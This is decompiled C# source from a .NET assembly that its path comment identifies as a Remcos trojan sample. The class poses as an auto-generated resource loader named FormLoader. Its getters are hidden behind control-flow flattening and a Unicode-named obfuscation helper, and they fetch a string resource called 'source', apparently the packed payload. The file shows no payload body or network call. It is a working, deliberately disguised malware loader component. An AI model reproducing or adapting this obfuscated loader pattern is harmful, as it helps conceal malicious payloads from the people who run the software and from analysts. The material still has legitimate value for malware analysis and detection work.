// Decompiled with JetBrains decompiler
// Type: Vändtia_Live_Server.My.Resources.FormLoader
// Assembly: yDseEhTG5bnen4G, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C5C9DF7-D67E-851A-F932-4F9F562A97E6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.MSIL.Remcos.gen-a9fcf50b626f7a735761798ddff08a65e037fbde2ef6e57f066150543ebcb249.exe

using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

namespace Vändtia_Live_Server.My.Resources
{
  [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
  [DebuggerNonUserCode]
  [CompilerGenerated]
  public class FormLoader
  {
    private static ResourceManager resourceMan;
    private static CultureInfo resourceCulture;

    internal FormLoader()
    {
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    public static ResourceManager ResourceManager
    {
      get
      {
        if ((!object.ReferenceEquals((object) FormLoader.resourceMan, (object) null) ? 1 : 0) == 0)
        {
label_4:
          int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(14);
          int num2 = 4;
          while (true)
          {
            switch (num2 ^ 25)
            {
              case 26:
                goto label_4;
              case 27:
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (FormLoader.get_source);
                num2 = 2;
                continue;
              case 28:
                ResourceManager resourceManager;
                switch (num1 + 16)
                {
                  case 0:
                    FormLoader.resourceMan = resourceManager;
                    num1 = -27;
                    goto label_1;
                  case 1:
                    RuntimeMethodHandle runtimeMethodHandle2 = __methodref (FormLoader.get_source);
                    num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(17);
                    goto label_1;
                  case 2:
                    resourceManager = new ResourceManager("Vändtia_Live_Server.FormLoader", typeof (FormLoader).Assembly);
                    num1 = -26;
                    goto label_1;
                  case 3:
                    goto label_11;
                  default:
                    num2 = 3;
                    continue;
                }
              case 29:
label_1:
                num1 ^= 22;
                break;
            }
            num2 = 5;
          }
        }
label_11:
        return FormLoader.resourceMan;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    public static CultureInfo Culture
    {
      get => FormLoader.resourceCulture;
      set => FormLoader.resourceCulture = value;
    }

    public static string source
    {
      get
      {
label_4:
        int num1 = 59;
        int num2 = -62;
        string source;
        while (true)
        {
          switch ((num2 ^ 32) + 33)
          {
            case 0:
              goto label_4;
            case 1:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (FormLoader.set_Culture);
              num2 = -64;
              continue;
            case 2:
              switch (num1)
              {
                case 32:
                case 35:
                  goto label_10;
                case 33:
                  source = FormLoader.ResourceManager.GetString(nameof (source), FormLoader.resourceCulture);
                  num1 = 58;
                  goto label_1;
                case 34:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (FormLoader.set_Culture);
                  num1 = 56;
                  goto label_1;
                default:
                  num2 = -1;
                  continue;
              }
            case 3:
label_1:
              num1 ^= 26;
              break;
          }
          num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(26);
        }
label_10:
        return source;
      }
    }
  }
}
